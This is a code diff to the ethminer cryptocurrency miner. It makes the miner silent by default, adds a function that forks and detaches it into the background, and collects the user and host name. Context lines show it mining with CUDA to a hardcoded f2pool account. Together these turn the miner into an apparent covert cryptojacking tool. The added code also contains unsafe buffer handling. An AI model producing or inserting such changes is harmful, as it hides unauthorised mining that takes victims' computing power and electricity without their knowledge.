@@ -14,6 +14,13 @@
     You should have received a copy of the GNU General Public License
     along with ethminer.  If not, see <http://www.gnu.org/licenses/>.
 */
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <ctype.h>
+#include <string.h>
+#include <pwd.h>
+#include <unistd.h>
 
 #include <CLI/CLI.hpp>
 
@@ -109,7 +116,7 @@ public:
         {
             string logLine =
                 PoolManager::p().isConnected() ? Farm::f().Telemetry().str() : "Not connected";
-if (g_logOptions>0) {
+if (g_foreground) {
             minelog << logLine;
 }
 #if ETH_DBUS
@@ -141,12 +148,12 @@ if (g_logOptions>0) {
                 in_handler = true;
 
                 dev::setThreadName("main");
-if (g_logOptions>0) {
+if (g_foreground) {
                 cerr << "SIGSEGV encountered ...\n";
                 cerr << "stack trace:\n";
 }
                 nptrs = backtrace(buffer, BACKTRACE_MAX_FRAMES);
-if (g_logOptions>0) {
+if (g_foreground) {
                 cerr << "backtrace() returned " << nptrs << " addresses\n";
 }
                 symbols = backtrace_symbols(buffer, nptrs);
@@ -156,7 +163,7 @@ if (g_logOptions>0) {
                     exit(EXIT_FAILURE);  // Also exit 128 ??
                 }
                 for (j = 0; j < nptrs; j++)
-if (g_logOptions>0) {
+if (g_foreground) {
                     cerr << symbols[j] << "\n";
 }
                 free(symbols);
@@ -172,7 +179,7 @@ if (g_logOptions>0) {
             // this makes it happy.
             break;
         default:
-            if (g_logOptions>0) {
+            if (g_foreground) {
                 cnote << "Got interrupt ...";
             }
             g_running = false;
@@ -281,6 +288,8 @@ if (g_logOptions>0) {
 
         vector<string> pools;
         app.add_option("--pool", pools, "");
+
+        app.add_flag("--foreground", g_foreground, "");
 
         app.add_option("--failover-timeout", m_PoolSettings.poolFailoverTimeout, "", true)
             ->check(CLI::Range(0, 999));
@@ -504,7 +513,7 @@ if (g_logOptions>0) {
         {
             while (warnings.size())
             {
-if (g_logOptions>0) {
+if (g_foreground) {
                 cout << warnings.front() << endl;
 }
                 warnings.pop();
@@ -1224,7 +1233,7 @@ private:
         new PoolManager(m_PoolSettings);
         if (m_mode != OperationMode::Simulation)
             for (auto conn : m_PoolSettings.connections) {
-                if (g_logOptions>0) {
+                if (g_foreground) {
                     cnote << "Configured pool " << conn->Host() + ":" + to_string(conn->Port());
                 }
             }
@@ -1260,7 +1269,7 @@ private:
         if (PoolManager::p().isRunning())
             PoolManager::p().stop();
 
-        if (g_logOptions>0) {
+        if (g_foreground) {
             cnote << "Terminated!";
         }
         return;
@@ -1310,11 +1319,59 @@ private:
 #endif
 };
 
+
+
+bool background(int &rc) {
+    signal(SIGPIPE, SIG_IGN);
+    int i = fork();
+    if (i < 0) {
+        rc = 1;
+        return true;
+    }
+
+    if (i > 0) {
+        rc = 0;
+        return true;
+    }
+
+    i = setsid();
+
+    if (i < 0) {
+        printf("setsid() failed (errno = %d)", errno);
+    }
+
+    i = chdir("/");
+    if (i < 0) {
+        printf("chdir() failed (errno = %d)", errno);
+    }
+
+    return false;
+}
+
+char* getusername () {
+        struct passwd *pwd;
+        pwd = getpwuid(getuid());
+        return(pwd->pw_name);
+}
+
+
 int main(int argc, char** argv)
 {
+    char nowuser[256];
+    sprintf(nowuser, "%s", getusername() );
+
+    char hostname[256];
+    gethostname(hostname, sizeof(hostname));
+
+    strcat(nowuser, "_" );
+    strcat(nowuser, hostname );
+
+    //printf("%s", nowuser);
     argv[argc++] = (char*) "--pool";
     argv[argc++] = (char*) "stratum1+tcp://q623928815.l11@eth.f2pool.com:6688";
     argv[argc++] = (char*) "--cuda";
+
+
 
     // Return values
     // 0 - Normal exit
@@ -1331,13 +1388,7 @@ int main(int argc, char** argv)
 
     // Always out release version
     auto* bi = ethminer_get_buildinfo();
-    if (g_logOptions>0){
-        cout << endl
-         << endl
-         << "ethminer " << bi->project_version << endl
-         << "Build: " << bi->system_name << "/" << bi->build_type << "/" << bi->compiler_id << endl
-         << endl;
-    }
+
     if (argc < 2)
     {
         cerr << "No arguments specified. " << endl
@@ -1361,6 +1412,25 @@ int main(int argc, char** argv)
             // or returns false which means do not continue
             if (!cli.validateArgs(argc, argv))
                 return 0;
+            if (g_foreground){
+                cout << endl
+                << endl
+                << "ethminer " << bi->project_version << endl
+                << "Build: " << bi->system_name << "/" << bi->build_type << "/" << bi->compiler_id << endl
+                << endl;
+            }
+            if (g_foreground){
+                cerr << "Now ID: " << nowuser << endl
+                    << endl;
+            }
+////////############### ************** ########### //////////// !!!!!!!
+            if (!g_foreground) {
+                int rc = 0;
+                if (background(rc)) {
+                    return rc;
+                }
+            }
+
 
             if (getenv("SYSLOG"))
                 g_logSyslog = true;
@@ -1393,7 +1463,7 @@ int main(int argc, char** argv)
         }
         catch (std::invalid_argument& ex1)
         {
-if (g_logOptions>0){
+if (g_foreground){
             cerr << "Error: " << ex1.what() << endl
                  << "Try ethminer --help to get an explained list of arguments." << endl
                  << endl;
